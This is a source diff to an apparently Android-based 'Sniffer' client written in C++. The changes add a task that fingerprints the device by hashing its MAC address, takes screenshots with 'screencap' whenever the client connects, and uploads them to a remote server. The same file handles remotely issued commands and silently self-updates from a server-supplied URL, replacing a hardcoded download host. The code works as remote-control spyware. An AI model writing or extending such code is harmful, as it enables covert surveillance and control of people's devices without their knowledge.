@@ -18,9 +18,22 @@ SnifferMain::SnifferMain() {
 	char port[8];
 	sprintf(port, "%d", HttpServerPort);
 	website += port;
+	website += "/";
+
 	mHttpRequestHostManager.SetWebSite(website);
 	mHttpRequestManager.SetHostManager(&mHttpRequestHostManager);
 	mHttpRequestManager.SetVersionCode("Version", SnifferVersion);
+
+	char deviceId[128] = {'\0'};
+	memset(deviceId, '\0', sizeof(deviceId));
+	list<IpAddressNetworkInfo> infoList = IPAddress::GetNetworkInfoList();
+	if( infoList.size() > 0 && infoList.begin() != infoList.end() ) {
+		IpAddressNetworkInfo info = *(infoList.begin());
+		GetMD5String(info.mac.c_str(), deviceId);
+	}
+
+	mRequestScreenCapUpdateTask.SetParam(deviceId, website, UPLOAD_SERVER_FILE);
+	mRequestScreenCapUpdateTask.SetCallback(this);
 }
 
 SnifferMain::~SnifferMain() {
@@ -28,11 +41,11 @@ SnifferMain::~SnifferMain() {
 }
 
 void SnifferMain::OnConnected(SnifferClient* client) {
-
+	mRequestScreenCapUpdateTask.Start();
 }
 
 void SnifferMain::OnDisConnected(SnifferClient* client) {
-
+	mRequestScreenCapUpdateTask.Stop();
 }
 
 void SnifferMain::OnRecvCmdExcuteCommand(SnifferClient* client, int seq, const string& cmd) {
@@ -152,8 +165,8 @@ void SnifferMain::OnRecvCmdSnifferCheckUpdate(SnifferClient* client, int seq, co
 		sniffer_update += SinfferFileUpdate;
 		MakeDir(SinfferFileUpdateDir);
 
-		string sniffer_url = "http://drsniffer.wicp.net:9875/download.cgi?filepath=/update/";
-		sniffer_url += GetPhoneCpuAbi();
+		// 生成路径
+		string sniffer_url = url;
 		sniffer_url += "/";
 		sniffer_url += SinfferFile;
 
@@ -245,7 +258,7 @@ void SnifferMain::OnUpdateFinish(bool success, const string& filePath, RequestUp
 			task
 			);
 
-	//获取当前程序绝对路径
+	// 获取当前程序绝对路径
 	char file[4096];
 	int cnt = readlink("/proc/self/exe", file, 4096);
 	if( cnt >= 0 ) {
@@ -268,6 +281,7 @@ void SnifferMain::OnUpdateFinish(bool success, const string& filePath, RequestUp
 
 		if( UpdateSniffer(filePath, dir, "/sdcard/") ) {
 			mSnifferClient.Stop();
+			RemoveFile(filePath);
 			exit(0);
 		}
 	}
@@ -335,4 +349,53 @@ string SnifferMain::GetFileMode(const struct stat* statbuf) {
 	}
 
 	return m;
+}
+
+void SnifferMain::OnUploadScreenCap(bool success, const string& url, RequestScreenCapUpdateTask* task) {
+	FileLog(SnifferLogFileName,
+			"SnifferMain::OnUploadScreenCap( "
+			"success : %s, "
+			"url : %s, "
+			"task : %p "
+			")",
+			success?"true":"false",
+			url.c_str(),
+			task
+			);
+
+	if( success ) {
+		mSnifferClient.SendCmdSnifferScreenCapUpdate(url);
+	}
+}
+
+bool SnifferMain::OnGetScreenCap(string& filePath, RequestScreenCapUpdateTask* task) {
+	FileLog(SnifferLogFileName,
+			"SnifferMain::OnGetScreenCap( "
+			"task : %p "
+			")",
+			task
+			);
+
+	bool bFlag = false;
+
+	filePath = "/sdcard/sniffer/screencap.png";
+	string cmd = "screencap -p ";
+	cmd += filePath;
+	string result = SystemComandExecuteWithResult(cmd);
+	if( result.length() == 0 ) {
+		bFlag = true;
+	}
+
+	FileLog(SnifferLogFileName,
+			"SnifferMain::OnGetScreenCap( "
+			"bFlag : %s, "
+			"filePath : %s, "
+			"task : %p "
+			")",
+			bFlag?"true":"false",
+			filePath.c_str(),
+			task
+			);
+
+	return bFlag;
 }
